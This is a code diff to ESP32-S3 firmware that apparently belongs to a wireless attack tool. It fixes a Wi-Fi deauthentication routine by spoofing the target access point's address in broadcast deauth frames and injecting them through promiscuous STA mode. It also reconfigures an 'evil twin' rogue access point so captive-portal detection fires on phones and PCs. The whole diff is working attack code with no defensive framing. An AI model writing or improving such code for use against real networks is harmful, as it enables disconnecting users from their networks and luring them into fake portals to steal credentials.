@@ -552,16 +552,19 @@ static void start_deauth(void) {
 
     uint8_t bssid_bytes[6];
     parse_bssid(deauth_bssid, bssid_bytes);
-    memcpy(deauth_frame + 10, bssid_bytes, 6);
-    memcpy(deauth_frame + 16, bssid_bytes, 6);
+    // Deauth frame: DA=broadcast, SA=target BSSID, BSSID=target BSSID
+    memset(deauth_frame + 4, 0xFF, 6);           // DA: broadcast
+    memcpy(deauth_frame + 10, bssid_bytes, 6);   // SA: target AP
+    memcpy(deauth_frame + 16, bssid_bytes, 6);   // BSSID: target AP
 
-    
+    // Use STA mode + promiscuous for reliable raw frame injection on ESP32-S3
     WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_AP_STA);
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
     vTaskDelay(pdMS_TO_TICKS(100));
-    WiFi.softAP("", nullptr, deauth_channel, 1, 4); 
-    vTaskDelay(pdMS_TO_TICKS(50));
+    esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+    vTaskDelay(pdMS_TO_TICKS(50));
 
     deauth_frames_sent = 0;
     deauth_last_burst_ms = 0;
@@ -569,17 +572,18 @@ static void start_deauth(void) {
 }
 
 static void poll_deauth(void) {
-    
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    // Inject via STA interface — works reliably on ESP32-S3 in promiscuous mode
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
     vTaskDelay(1 / portTICK_PERIOD_MS);
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
     vTaskDelay(1 / portTICK_PERIOD_MS);
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
     deauth_frames_sent += 3;
 }
 
 static void stop_deauth_and_restore(void) {
     Serial.printf("[RECON] Deauth stopped after %d frames. Restoring state...\n", deauth_frames_sent);
+    esp_wifi_set_promiscuous(false);
     WiFi.softAPdisconnect(true);
     if (was_web_server_active) {
         web_server_init();
@@ -1096,15 +1100,18 @@ static void start_evil_twin_server(void) {
 
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_AP);
-    delay(100);
+    delay(200);
 
-    IPAddress apIP(172, 0, 0, 1);
-    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(et_ssid, NULL, et_channel);
+    // Use standard 192.168.4.1 — required for captive portal detection on Android/iOS/Windows
+    IPAddress apIP(192, 168, 4, 1);
+    IPAddress gateway(192, 168, 4, 1);
+    IPAddress subnet(255, 255, 255, 0);
+    WiFi.softAPConfig(apIP, gateway, subnet);
+    WiFi.softAP(et_ssid, NULL, et_channel, 0, 4);
 
-    
+    // Wait for AP to fully initialize before starting servers
     uint32_t t = millis();
-    while (millis() - t < 2000) yield();
+    while (millis() - t < 2500) yield();
 
     etServer = new AsyncWebServer(80);
 
